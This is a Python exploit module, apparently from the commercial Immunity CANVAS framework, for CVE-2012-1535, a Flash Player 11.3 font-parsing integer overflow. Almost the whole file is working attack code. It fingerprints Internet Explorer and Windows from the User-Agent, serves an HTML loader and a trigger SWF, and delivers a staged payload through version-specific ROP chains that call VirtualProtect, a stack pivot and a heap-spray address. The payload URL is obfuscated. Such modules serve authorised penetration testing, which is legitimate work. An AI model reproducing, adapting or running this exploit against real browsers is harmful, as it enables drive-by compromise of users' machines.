#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from httpclientside import httpclientside

import sys
import struct
import base64
import random
import zlib

import xorencoder
import canvasengine

from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from engine.config import canvas_root_directory
from libs.ua_parser import user_agent_parser
from libs.spkproxy import header,body
from libs.canvasos import canvasos

NAME                              = 'adobe_flash_otf_parsing'
DESCRIPTION                       = 'Adobe Flash Player 11.3.300.2x integer overflow font parsing code execution'

DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "Adobe"
DOCUMENTATION['Date public']      = '07/16/2012'
DOCUMENTATION['References']       = 'http://www.adobe.com/support/security/bulletins/apsb12-18.html'
DOCUMENTATION['Repeatability']    = 'Once'
DOCUMENTATION['VersionsAffected'] = 'Adobe Flash Player 11.3.300.257/11.3.300.265/11.3.300.268'
DOCUMENTATION['CVE Name']         = 'CVE-2012-1535'
DOCUMENTATION['CVE Url']          = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-1535'
DOCUMENTATION['CVSS']             = 9.0

VERSION                           = '1.0'

PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['XP', 'Vista', '7']

DOCUMENTATION['Notes']            = """
This exploit takes advantage of a integer overflow that leads to a heap based buffer overflow. The 
kern_table contains an integer that when set to >= 0x1000000 leads to integer wrap which eventually
triggers a function pointer call.

Using a carefully constructed heap spray, an attacker can control the memory located at the 
function pointer and achieve reliable code execution.

Tested on:
* Windows XP Professional SP3 English with Internet Explorer 6
* Windows XP Professional SP3 English with Internet Explorer 7
* Windows XP Professional SP3 English with Internet Explorer 8
* Windows Vista English with Internet Explorer 7
* Windows Vista English with Internet Explorer 8
* Windows Vista English with Internet Explorer 9
* Windows 7 English with Internet Explorer 8
* Windows 7 English with Internet Explorer 9

Usage (important):
        This exploit will most likley not work with the js_recon module as loading third party 
        software will damage heap offsets.
"""

CHANGELOG                         = """
"""            

# command line usage:
# python ./exploits/clientd/clientd.py -l 10.1.1.7 -d 5555 -O server_port:8080 -O allowed_attack_modules:adobe_flash_otf_parsing -O auto_detect_exploits:0 -O always_do_recon:False
# python ./exploits/clientd/clientd.py -l 10.1.1.7 -d 5555 -O server_port:8080 -O allowed_attack_modules:adobe_flash_otf_parsing -O auto_detect_exploits:0 -O always_do_recon:False -O direct_response:1 -O redirect:0 
# ./commandlineInterface.py -v17 -p5555

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.filename           = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.stage1             = "\x0c\x0c\x0c\x0c" * 3
        self.shellcode          = "\xcc" * 300
        self.swfName            = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".swf"
        self.payloadName        = "".join( [ random.choice(string.uppercase) for x in range(8) ] )
        self.trigger            = os.path.join(os.path.dirname(__file__), 'resources', "trigger.swf")
        self.universal          = True
        self.browserTargets            = [
                                    [ 'Automatic', {} ],
                                    [
                                            'IE 6 on Windows XP SP3',
                                            {
                                                    'Rop'  : False
                                            }
                                    ],
                                    [
                                            'IE 7 on Windows XP SP3',
                                            {
                                                    'Rop'  : False
                                            }
                                    ],
                                    [
                                            'IE 8 on Windows XP SP3',
                                            {
                                                    'Rop'  : True,
                                                    'ASLR' : False
                                            }
                                    ],
                                    [
                                            'IE 7 on Windows Vista SP2',
                                            {
                                                    'Rop'  : False
                                            }
                                    ],
                                    [
                                            'IE 8 on Windows Vista SP2',
                                            {
                                                    'Rop'  : True,
                                                    'ASLR' : True
                                            }
                                    ],
                                    [
                                            'IE 9 on Windows Vista SP2',
                                            {
                                                    'Rop'  : True,
                                                    'ASLR' : True
                                            }
                                    ],
                                    [
                                            'IE 8 on Windows 7 SP1',
                                            {
                                                    'Rop'  : True,
                                                    'ASLR' : True
                                            }
                                    ],
                                    [
                                            'IE 9 on Windows 7 SP1',
                                            {
                                                    'Rop'  : True,
                                                    'ASLR' : True
                                            }
                                    ]        
                                  ]
        # set the default target
        self.browserTarget             = self.browserTargets[0]

    # set the target based on the supplied UserAgent
    def setTarget(self, ua):
        # ie6 + xp
        if "MSIE 6.0" in ua and "NT 5.1" in ua:
            self.browserTarget = self.browserTargets[1]
        # ie6 + XP
        elif "MSIE 6.1" in ua and "NT 5.1" in ua:
            self.browserTarget = self.browserTargets[1]
        # ie7 + XP
        elif "MSIE 7.0" in ua and "NT 5.1" in ua: 
            self.browserTarget = self.browserTargets[2]
        # ie8 + XP
        elif "MSIE 8.0" in ua and "NT 5.1" in ua:
            self.browserTarget = self.browserTargets[3]
        # ie7 + vista
        elif "MSIE 7.0" in ua and "NT 6.0" in ua:
            self.browserTarget = self.browserTargets[4]
        # ie8 + vista
        elif "MSIE 8.0" in ua and "NT 6.0" in ua:
            self.browserTarget = self.browserTargets[5]
        # ie9 + vista
        elif "MSIE 9.0" in ua and "NT 6.0" in ua:
            self.browserTarget = self.browserTargets[6]
        # ie8 + win7
        elif "MSIE 8.0" in ua and "NT 6.1" in ua:
            self.browserTarget = self.browserTargets[7]
        # ie9 + win7
        elif "MSIE 9.0" in ua and "NT 6.1" in ua:
            self.browserTarget = self.browserTargets[8]
        
    # check for IE versions and NT versions
    def is_vulnerable(self, clientdata):
        ua = clientdata['user_agent']
        # ie6 + xp
        if "MSIE 6.0" in ua and "NT 5.1" in ua:
            return 1
        # ie6 + XP
        elif "MSIE 6.1" in ua and "NT 5.1" in ua:
            return 1
        # ie7 + XP
        elif "MSIE 7.0" in ua and "NT 5.1" in ua:
            return 1
        # ie8 + XP
        elif "MSIE 8.0" in ua and "NT 5.1" in ua:
            return 1
        # ie7 + vista
        elif "MSIE 7.0" in ua and "NT 6.0" in ua:
            return 1
        # ie8 + vista
        elif "MSIE 8.0" in ua and "NT 6.0" in ua:
            return 1
        # ie9 + vista
        elif "MSIE 9.0" in ua and "NT 6.0" in ua:
            return 1
        # ie8 + win7
        elif "MSIE 8.0" in ua and "NT 6.1" in ua:
            return 1
        # ie9 + win7
        elif "MSIE 9.0" in ua and "NT 6.1" in ua:
            return 1
        # else, I have nfi
        else:
            self.log("Not IE 6/7/8/9 on Windows XP/Vista/win7 - The target is still possibly vulnerable, but not to this exploit")
            return 0

    def run(self):
        self.log("Run this from clientd")
        return 0 

    def createAndEncodeShellcode(self):
        self.createShellcode()
        self.shellcode = self.shellcode.encode("hex")
        
    def generateStageOneCode(self, flashVersion):
        self.log("Generating stage 1 shellcode")
        self.log("Detect browser as: %s" % self.browserTarget[0])
        stackPivot = []
        ropChain   = []
        
        # XP/Vista targets using ie6/7
        if not self.browserTarget[1]["Rop"]:
            rop = "\x0c" * 0x10
            
        # XP/Vista/Win7 targets using ie8/9
        elif self.browserTarget[1]["Rop"]:
            rop = ""
            print self.browserTarget
            if not self.browserTarget[1]["ASLR"]:
                if "11,3,300,257" in flashVersion:
                    self.log("Using Rop Chain For Flash 11.3.300.257")
                    stackPivot = [
                        0x10004171, # pop edi; pop esi; retn (1e0d0000)
                        0x0c0c0c0c,
                        0x1001d891, # xchg eax, esp; ret (1e0d0008)
                    ]
                    ropChain = [
                        0x10241001, # pop eax; retn (Flash32_11_3_300_257.ocx)
                        0x106e3384, # *&VirtualProtect()
                        0x1029de2f, # mov eax,[eax]; retn (Flash32_11_3_300_257.ocx)
                        0x106add37, # xchg eax,esi; retn (Flash32_11_3_300_257.ocx)
                        0x1064e000, # pop ebp; retn (Flash32_11_3_300_257.ocx)
                        0x10175c57, # jmp esp (from Flash32_11_3_300_257.ocx)
                        0x106a4010, # pop ebx; retn(Flash32_11_3_300_257.ocx)
                        0x00000201, # <- change size to mark as executable if needed (-> ebx)
                        0x104de800, # pop ecx; retn (Flash32_11_3_300_257.ocx)
                        0x10955000, # W pointer (lpOldProtect) (-> ecx)
                        0x10649003, # pop edi; retn (Flash32_11_3_300_257.ocx)
                        0x10649004, # retn (-> edi)
                        0x10649987, # pop edx; retn (Flash32_11_3_300_257.ocx)
                        0x00000040, # newProtect (0x40) (-> edx)
                        0x10241001, # pop eax; retn (Flash32_11_3_300_257.ocx)
                        0x90909090, # nops (-> eax)
                        0x1060e809, # pushad; retn (Flash32_11_3_300_257.ocx)
                    ]
                
                elif "11,3,300,265" in flashVersion:
                    self.log("Using Rop Chain For Flash 11.3.300.265")
                    stackPivot = [
                        0x10004171, # pop edi; pop esi; retn (1e0d0000)
                        0x0c0c0c0c,
                        0x1001d6d3, # xchg eax, esp; retn (1e0d0008)
                    ]
                    ropChain = [
                        0x10241002, # pop eax; retn (Flash32_11_3_300_265.ocx)
                        0x106e338c, # <- *&VirtualProtect()
                        0x1029ea04, # mov eax,[eax]; retn (Flash32_11_3_300_265.ocx)
                        0x103d60b8, # xchg eax,esi # retn (Flash32_11_3_300_265.ocx)
                        0x105cc000, # pop ebp; retn (Flash32_11_3_300_265.ocx)
                        0x1001c5cd, # jmp esp (from Flash32_11_3_300_265.ocx)
                        0x10398009, # pop ebx; retn (Flash32_11_3_300_265.ocx)
                        0x00000201, # <- change size to mark as executable if needed (-> ebx)
                        0x10434188, # pop ecx; retn (Flash32_11_3_300_265.ocx)
                        0x10955000, # W pointer (lpOldProtect) (-> ecx)
                        0x105c1811, # pop edi; retn (Flash32_11_3_300_265.ocx)
                        0x105c1812, # retn (-> edi)
                        0x10650602, # pop edx; retn (Flash32_11_3_300_265.ocx)
                        0x00000040, # newProtect (0x40) (-> edx)
                        0x10241002, # pop eax; retn (Flash32_11_3_300_265.ocx)
                        0x90909090, # NOPS (-> eax)
                        0x1062800f, # pushad; retn (Flash32_11_3_300_265.ocx)
                    ]
    
                elif "11,3,300,268" in flashVersion:
                    self.log("Using Rop Chain For Flash 11.3.300.268")
                    stackPivot = [
                        0x10004171, # pop edi; pop esi; retn (1e0d0000)
                        0x0c0c0c0c,
                        0x1001d755, # xchg eax, esp # ret (1e0d0008)
                    ]
                    ropChain = [
                        0x1023e9b9, # pop eax; retn (Flash32_11_3_300_268.ocx)
                        0x106e438c, # <- *&VirtualProtect()
                        0x10198e00, # mov eax,[eax]; retn (Flash32_11_3_300_268.ocx)
                        0x106ddf15, # xchg eax,esi; retn (Flash32_11_3_300_268.ocx)
                        0x1035f000, # pop ebp; retn (Flash32_11_3_300_268.ocx)
                        0x10175c28, # jmp esp (from Flash32_11_3_300_268.ocx)
                        0x105e0013, # po ebx; retn (Flash32_11_3_300_268.ocx)
                        0x00000201, # <- change size to mark as executable if needed (-> ebx)
                        0x10593801, # pop ecx; retn (Flash32_11_3_300_268.ocx)
                        0x1083c000, # W pointer (lpOldProtect) (-> ecx)
                        0x10308b0e, # pop edi; retn (Flash32_11_3_300_268.ocx)
                        0x10308b0f, # retn (-> edi)
                        0x10663a00, # pop edx; retn (Flash32_11_3_300_268.ocx)
                        0x00000040, # newProtect (0x40) (-> edx)
                        0x1023e9b9, # pop eax; retn (Flash32_11_3_300_268.ocx)
                        0x90909090, # nops (-> eax)
                        0x1069120b, # pushad; retn (Flash32_11_3_300_268.ocx)
                    ]
                
            elif self.browserTarget[1]["ASLR"]:
                self.log("Lets hope your target is using JAVA!")
                stackPivot = [
                    0x7c34a028, # pop edi; pop esi; retn (1e0d0000)
                    0x0c0c0c0c,
                    0x7c348b05, # xchg eax,esp; retn (1e0d0008)
                ]
                ropChain = [
                    0x7c37653d, # pop eax; pop edi; pop esi; pop ebx; pop ebp; retn
                    0x00001000, # (dwSize)
                    0x7c347f98, # retn (ROP NOP)
                    0x7c3415a2, # jmp [eax]
                    0xffffffff,
                    0x7c376402, # skip 4 bytes
                    0x7c345255, # inc ebx; fpatan; retn
                    0x7c352174, # add ebx,eax; xor eax,eax; inc eax; retn
                    0x7c344f87, # pop edx; retn
                    0x00000040, # flNewProtect
                    0x7c34d201, # pop ecx; retn
                    0x7c38b001, # &Writable location
                    0x7c347f97, # pop eax; retn
                    0x7c37a151, # *&VirtualProtect() - 0x0EF [IAT msvcr71.dll]
                    0x7c378c81, # pushad; add AL,0EF; retn
                    0x7c345c30, # push esp; retn
                ]
            
        for pivot in stackPivot:
            rop += struct.pack('<L', pivot)
        for dword in ropChain:
            rop += struct.pack('<L', dword)
        return rop.encode("hex")
    
    def encodeURI(self):
        compressedURI = zlib.compress("/%s" % self.payloadName)
        encodedURI = ""
        for encChar in compressedURI:
            encodedURI += chr(ord(encChar) ^ 120)
        encodedURI = encodedURI.encode("hex")
        return encodedURI
        
    def generateHtml(self, ua, encodedURI):
        html = """<html>
        <head>
        </head>
        <body>
        <object width="1" height="1" type="application/x-shockwave-flash" data="%s?cat=%s">
        <param name="movie" value="%s?cat=%s">
        </object>
        </body>
        </html>""" % (self.swfName, encodedURI, self.swfName, encodedURI)
        html = html.replace("        ","")
        return html
    
    def makeSWF(self):
        return open(self.trigger,"rb").read()    
 
    def makesploit(self, clientheader, clientbody):
        h=header('SERVER')
        b=body()
        encodedURI = self.encodeURI()
        ua = clientheader.getHeaderValue('User-Agent')
        print ua
        self.setTarget(ua)
        
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None
            
        # serve the html loader
        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            self.createShellcode()
            sploitstring = self.generateHtml(ua, encodedURI)
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        
        # serve the swf exploit
        elif clientheader.URL.count("%s?cat=%s" % (self.swfName, encodedURI)):
            self.log('Serving SWF')
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type','application/x-shockwave-flash')
            
        # serve the mosdef
        elif clientheader.URL.count(self.payloadName):
            fversion = clientheader.getHeaderValue('x-flash-version')
            ua = clientheader.getHeaderValue('User-Agent')
            self.log('Serving Payload')
            self.stage1 = self.generateStageOneCode(fversion)
            self.createAndEncodeShellcode()
            b.setBody(self.stage1 + self.shellcode)
            h.addHeader('Content-Type','text/html')
            
        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed. Not vulnerable?')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h,b
        else:
            
            # basically, if we redirect the target on
            # the first request we are doomed. So instead
            # we just send them the HTML loader straight away
            self.log('Serving HTML file (via the redirect)')
            self.createShellcode()
            sploitstring = self.generateHtml(ua, encodedURI)
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    print "This needs to be run from clientd"
